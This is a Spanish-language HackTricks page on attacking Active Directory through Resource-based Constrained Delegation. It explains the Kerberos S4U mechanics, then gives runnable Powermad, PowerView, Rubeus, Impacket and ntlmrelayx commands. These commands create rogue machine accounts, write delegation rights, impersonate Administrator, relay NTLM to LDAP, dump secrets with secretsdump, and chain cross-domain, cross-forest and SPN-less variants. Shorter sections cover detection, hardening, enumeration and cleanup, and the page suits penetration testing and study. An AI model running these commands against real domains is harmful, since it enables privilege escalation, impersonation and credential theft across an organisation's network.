# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Conceptos básicos de Resource-based Constrained Delegation

Esto es similar a la [Constrained Delegation](constrained-delegation.md) básica, pero **en lugar de** otorgar permisos a un **objeto** para **suplantar a cualquier usuario contra una máquina**, Resource-based Constrain Delegation **establece** en **el objeto quién puede suplantar a cualquier usuario contra él**.<sup>[[12]](#references)</sup>

En este caso, el objeto restringido tendrá un atributo llamado _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ con el nombre del usuario que puede suplantar a cualquier otro usuario contra él.

Otra diferencia importante entre esta Constrained Delegation y las otras delegaciones es que cualquier usuario con **permisos de escritura sobre una cuenta de máquina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) puede establecer **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (en las otras formas de Delegation se necesitaban privilegios de administrador del dominio).<sup>[[1]](#references)</sup>

### Nuevos conceptos

En Constrained Delegation se indicaba que el flag **`TrustedToAuthForDelegation`** dentro del valor _userAccountControl_ del usuario era necesario para realizar un **S4U2Self.** Pero eso no es completamente cierto.\
La realidad es que, incluso sin ese valor, puedes realizar un **S4U2Self** contra cualquier usuario si eres un **servicio** (tienes un SPN), pero, si **tienes `TrustedToAuthForDelegation`**, el TGS devuelto será **Forwardable** y, si **no tienes** ese flag, el TGS devuelto **no será** **Forwardable**.<sup>[[5]](#references)</sup>

Sin embargo, si el **TGS** utilizado en **S4U2Proxy** **NO es Forwardable**, intentar abusar de una **basic Constrain Delegation** **no funcionará**. Pero si intentas explotar una **Resource-Based constrain delegation, funcionará**.<sup>[[1]](#references)[[2]](#references)</sup>

### Estructura del ataque

> Si tienes **privilegios equivalentes de escritura** sobre una cuenta de **Computer**, puedes obtener **acceso privilegiado** en esa máquina.

Supongamos que el atacante ya tiene **privilegios equivalentes de escritura sobre el equipo víctima**.

1. El atacante **compromete** una cuenta que tiene un **SPN** o **crea una** (“Service A”). Ten en cuenta que cualquier _Admin User_ sin ningún otro privilegio especial puede **crear** hasta 10 objetos Computer (**_MachineAccountQuota_**) y establecerles un **SPN**. Por lo tanto, el atacante puede simplemente crear un objeto Computer y establecer un SPN.
2. El atacante **abusa de su privilegio WRITE** sobre el equipo víctima (ServiceB) para configurar Resource-based constrained delegation y permitir que ServiceA suplante a cualquier usuario contra ese equipo víctima (ServiceB).
3. El atacante utiliza Rubeus para realizar un **ataque S4U completo** (S4U2Self y S4U2Proxy) desde Service A hacia Service B para un usuario **con acceso privilegiado a Service B**.
1. S4U2Self (desde la cuenta con SPN comprometida/creada): Solicitar un **TGS de Administrator para mí** (no Forwardable).
2. S4U2Proxy: Usar el **TGS no Forwardable** del paso anterior para solicitar un **TGS** de **Administrator** al **host víctima**.
3. Aunque estés utilizando un TGS no Forwardable, como estás explotando Resource-based constrained delegation, funcionará.
4. El atacante puede hacer **pass-the-ticket** y **suplantar** al usuario para obtener **acceso al ServiceB víctima**.<sup>[[1]](#references)</sup>

Para comprobar el _**MachineAccountQuota**_ del dominio puedes utilizar:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Ataque

### Creación de un objeto de equipo

Puedes crear un objeto de equipo dentro del dominio usando **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configuración de Resource-based Constrained Delegation

**Usando el módulo de PowerShell activedirectory**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Uso de powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Realización de un ataque S4U completo (Windows/Rubeus)

En primer lugar, creamos el nuevo objeto Computer con la contraseña `123456`, por lo que necesitamos el hash de esa contraseña:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Esto imprimirá los hashes RC4 y AES de esa cuenta.\
Ahora, se puede realizar el ataque:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Puedes generar más tickets para más servicios con una sola solicitud usando el parámetro `/altservice` de Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Ten en cuenta que los usuarios tienen un atributo llamado "**Cannot be delegated**". Si un usuario tiene este atributo establecido en True, no podrás suplantarlo. Esta propiedad se puede ver dentro de bloodhound.

### Herramientas de Linux: RBCD de extremo a extremo con Impacket (2024+)

Si trabajas desde Linux, puedes realizar la cadena completa de RBCD utilizando las herramientas oficiales de Impacket:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notas
- Si LDAP signing/LDAPS está enforced, usa `impacket-rbcd -use-ldaps ...`.
- Prefiere claves AES; muchos dominios modernos restringen RC4. Impacket y Rubeus admiten flows que solo usan AES.
- Impacket puede reescribir el `sname` ("AnySPN") para algunas tools, pero obtén el SPN correcto siempre que sea posible (por ejemplo, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD entre dominios y entre forests

Si el **delegating principal** que controlas se encuentra en un **dominio diferente** (o incluso en un **forest diferente**) al del **resource computer**, el abuso sigue siendo **RBCD**, pero el flujo del ticket ya no es el habitual `S4U2Self -> S4U2Proxy` de un único dominio.

### RBCD entre dominios: configura el foreign principal mediante su SID

Cuando estableces `msDS-AllowedToActOnBehalfOfOtherIdentity` desde un **dominio diferente**, es posible que la máquina/usuario foreign **no pueda resolverse por nombre** en el LDAP del dominio objetivo. En ese caso, configura la entrada de delegation usando el **SID** del foreign principal en lugar de su sAMAccountName/UPN.

Esto es especialmente relevante al relayear NTLM hacia LDAP con `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notas:
- `--sid` indica a `ntlmrelayx.py` que trate `--escalate-user` como un SID, lo cual es necesario cuando la cuenta delegante es externa al dominio de destino.
- Aunque la herramienta muestre `User not found in LDAP`, la escritura de delegación aún puede tener éxito porque el descriptor de seguridad almacena directamente el SID externo.

### RBCD entre dominios: secuencia S4U entre realms

Una vez que el principal externo está en `msDS-AllowedToActOnBehalfOfOtherIdentity`, el flujo funcional entre dominios es:<sup>[[9]](#references)[[13]](#references)</sup>

1. Obtener un **TGT** para el principal delegante desde su propio dominio.
2. Solicitar un **TGT de referral** para `krbtgt/<target-domain>`.
3. Solicitar un **referral S4U2Self entre realms** para el usuario suplantado en el DC del dominio de destino.
4. Solicitar el ticket **S4U2Self** real para ese usuario de vuelta en el dominio delegante.
5. Realizar **S4U2Proxy** en el dominio delegante para obtener un ticket de referral para el dominio de destino.
6. Realizar el **S4U2Proxy** final en el DC del dominio de destino para obtener el service ticket para `cifs/host.target`, `host/host.target`, etc.

Por eso las herramientas estándar de Linux suelen fallar con RBCD entre dominios:<sup>[[9]](#references)</sup>
- el **realm** de la solicitud puede tener que diferir del realm del TGT utilizado en el `TGS-REQ`
- la cadena necesita **pasos S4U2Proxy independientes**, no solo `S4U2Self` o `S4U2Self` seguido inmediatamente de un único `S4U2Proxy`

### RBCD entre dominios desde Linux

Synacktiv publicó una implementación de `getST.py` de Impacket que reproduce la secuencia entre realms desde Linux mediante la gestión explícita de los dos KDC:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operativamente, los nuevos argumentos son:
- `-dc-ip`: DC del dominio **delegante**
- `-targetdomain`: dominio del **resource computer**
- `-targetdc`: DC del dominio del **resource**

### Limitaciones de RBCD entre bosques

RBCD entre bosques tiene una limitación importante: **el usuario suplantado debe pertenecer al mismo bosque que el principal delegante**. En otras palabras, si tu machine account controlada está en `valhalla.local` y el resource target está en `asgard.local`, por lo general **no puedes suplantar usuarios arbitrarios de `asgard.local`** en ese resource mediante RBCD.<sup>[[9]](#references)</sup>

Sigue siendo explotable cuando:
- el usuario del **bosque delegante** es un **local admin** (o tiene privilegios equivalentes) en el host resource del otro bosque
- un trust permite la ruta de autenticación necesaria y el SID externo es aceptado en el security descriptor del computer target

### Particularidades del protocolo RBCD entre bosques

RBCD entre bosques no es simplemente «cross-domain más un trust». El flujo observado incluye dos particularidades que las herramientas comunes históricamente omiten:<sup>[[9]](#references)</sup>

1. Una solicitud **S4U2Proxy** adicional que establece `PA-PAC-OPTIONS=branch-aware`
2. Un service ticket final que puede devolverse usando **RC4**, incluso cuando se solicitaron otros etypes

El flujo práctico es:

1. Obtener un TGT para el principal delegante en el forest A.
2. Solicitar **S4U2Self** para el usuario suplantado en el forest A.
3. Solicitar **S4U2Proxy** en el forest A para obtener un referral TGT para el forest B.
4. Enviar un segundo **S4U2Proxy** en el forest A **sin el ticket S4U2Self como additional ticket**, pero con `branch-aware` habilitado, para obtener otro referral TGT para el forest B.
5. Opcionalmente, solicitar un service ticket normal en el forest B para el principal delegante (este ticket no es necesario para el abuso final).
6. Usar los referral tickets de los pasos 3 y 4 para solicitar el ticket **S4U2Proxy** final en el forest B para el usuario del forest A suplantado, dirigido al SPN target.

### RBCD entre bosques desde Linux

La misma branch de Synacktiv Impacket añade un switch `-forest` para esta lógica:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### RBCD recursivo entre varios dominios (3+ dominios)

En los **bosques con varios dominios**, tanto **S4U2Self** como **S4U2Proxy** pueden ser **recursivos** en lugar de detenerse después de una sola referencia:

- **S4U2Self recursivo**: el primer `S4U2Self` se envía al **dominio del usuario suplantado**, los saltos intermedios entre dominios padre/hijo se recorren mediante referencias `TGS-REQ` normales para `krbtgt/<REALM>`, y el **`S4U2Self` final** se envía en el **dominio propio del principal delegado**.
- Esto significa que **solo poseer un TGT** de una cuenta de máquina puede ser suficiente para suplantar a un **administrador de otro dominio del mismo bosque** y solicitar `cifs/host`, `host/host`, `wsman/host`, etc.
- **S4U2Proxy recursivo** sigue la cadena de confianza de la misma forma: los saltos intermedios reutilizan el ticket anterior como TGT mientras solicitan la siguiente referencia `krbtgt/<REALM>`, y solo el último salto devuelve el ticket de servicio final.<sup>[[10]](#references)</sup>

Un ejemplo práctico dentro del mismo bosque es:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### RBCD cross-domain / cross-forest sin SPN

Si el **delegating principal es un usuario sin un SPN**, el último `S4U2Self` recursivo falla con **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. La solución alternativa consiste en **reintentar únicamente el salto final como `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Versión corta de la cadena de abuso:

1. Autenticarse con el **hash NT** para forzar al KDC a usar **RC4-HMAC (etype 23)**.
2. Solicitar primero **`-self -u2u`** y mantener ese ticket separado del posterior paso de proxy.
3. Extraer la clave de sesión del **TGT** con `describeTicket.py`.
4. Reemplazar el **hash NT** del usuario por esa **clave de sesión** usando `changepasswd.py -newhashes <session_key>`.
5. Reutilizar el ticket `S4U2Self+U2U` como **`-additional-ticket`** durante una solicitud **`-proxy`** independiente.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Consideraciones operativas:

- Cuando el **primer salto de confianza ya es otro forest**, prioriza el algoritmo **branch-aware** (`getST.py ... -forest`) para coincidir con el comportamiento nativo de Windows. Si el forest extranjero solo se alcanza **más adelante** en la cadena, el flujo recursivo no branch-aware todavía puede funcionar.<sup>[[9]](#references)</sup>
- En DCs recientes de **Windows Server 2022/2025**, forzar RC4 puede fallar con **`KDC_ERR_ETYPE_NOSUPP`** debido a la obsolescencia de RC4; esto puede hacer que **SPN-less RBCD** sea imposible aunque el RBCD clásico basado en SPN siga funcionando con AES.<sup>[[15]](#references)</sup>
- Ejecuta **`S4U2Self+U2U` antes de cambiar el hash/password del usuario**: `SamrChangePasswordUser` **no** vuelve a calcular las claves AES de Kerberos de la cuenta, por lo que cambiar el password primero puede romper las solicitudes de tickets posteriores.<sup>[[14]](#references)</sup>
- La cuenta suplantada debe seguir siendo **delegable**: **Protected Users** y las cuentas con **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** bloquean la cadena.

## Notas de detección / hardening

- Las rutas de RBCD entre dominios/forests todavía suelen crearse mediante **ACL abuse** o **relay-to-LDAP**. Aplica **LDAP signing** y **LDAP channel binding** en los DCs para romper las rutas de configuración habituales.
- Audita quién puede escribir `msDS-AllowedToActOnBehalfOfOtherIdentity` en objetos de equipo y resuelve los SIDs almacenados, incluidos los **foreign security principals**.
- En entornos con muchos trusts, revisa **Selective Authentication**, **SID filtering** y si los usuarios de un forest extranjero tienen privilegios de **local admin** en los hosts de recursos.

### Acceso

La última línea de comandos ejecutará el **ataque S4U completo e inyectará el TGS** de Administrator al host víctima **en memoria**.\
En este ejemplo se solicitó un TGS para el servicio **CIFS** de Administrator, por lo que podrás acceder a **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abusar de diferentes service tickets

Obtén información sobre los [**service tickets disponibles aquí**](silver-ticket.md#available-services).

## Enumeración, auditoría y limpieza

### Enumerar equipos con RBCD configurado

PowerShell (decodificando el SD para resolver los SID):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (leer o vaciar con un comando):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Limpieza / restablecimiento de RBCD

- PowerShell (borrar el atributo):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Errores de Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Esto significa que kerberos está configurado para no usar DES o RC4 y solo estás proporcionando el hash RC4. Proporciona a Rubeus al menos el hash AES256 (o proporciona los hashes rc4, aes128 y aes256). Ejemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** durante `-self` para un usuario normal: el principal delegante probablemente **no tiene SPN**. Reintenta el **último salto** como **`S4U2Self+U2U`** en lugar de un `S4U2Self` normal.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** durante **RBCD sin SPN**: los DC recientes pueden rechazar la ruta **RC4-HMAC** forzada requerida por el truco de **`S4U2Self+U2U` + sustitución de la clave de sesión**. Prueba en su lugar una ruta de **RBCD respaldada por SPN** clásica con AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Esto significa que la hora del equipo actual es diferente de la del DC y kerberos no está funcionando correctamente.
- **`preauth_failed`**: Esto significa que la combinación de nombre de usuario + hashes proporcionada no funciona para iniciar sesión. Es posible que hayas olvidado poner el carácter "$" dentro del nombre de usuario al generar los hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`****: Esto puede significar:
- El usuario que intentas suplantar no puede acceder al servicio deseado (porque no puedes suplantarlo o porque no tiene suficientes privilegios)
- El servicio solicitado no existe (si solicitas un ticket para winrm pero winrm no se está ejecutando)
- El fakecomputer creado ha perdido sus privilegios sobre el servidor vulnerable y debes devolvérselos.
- Estás abusando de KCD clásico; recuerda que RBCD funciona con tickets S4U2Self no reenviables, mientras que KCD requiere que sean reenviables.

## Notas, relays y alternativas

- También puedes escribir el RBCD SD mediante AD Web Services (ADWS) si LDAP está filtrado. Consulta:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Las cadenas de relay de Kerberos terminan frecuentemente en RBCD para conseguir SYSTEM local en un solo paso. Consulta ejemplos prácticos de extremo a extremo:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Si LDAP signing/channel binding están **deshabilitados** y puedes crear una machine account, herramientas como **KrbRelayUp** pueden retransmitir una autenticación de Kerberos forzada hacia LDAP, establecer `msDS-AllowedToActOnBehalfOfOtherIdentity` para tu machine account en el objeto del equipo objetivo e suplantar inmediatamente a **Administrator** mediante S4U desde fuera del host.<sup>[[8]](#references)</sup>

## Referencias

- [1] [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [2] [Another Word on Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Resource-Based Constrained Delegation Abuse](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: An Offensive Kerberos Overview](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Quick Linux cheatsheet with recent syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
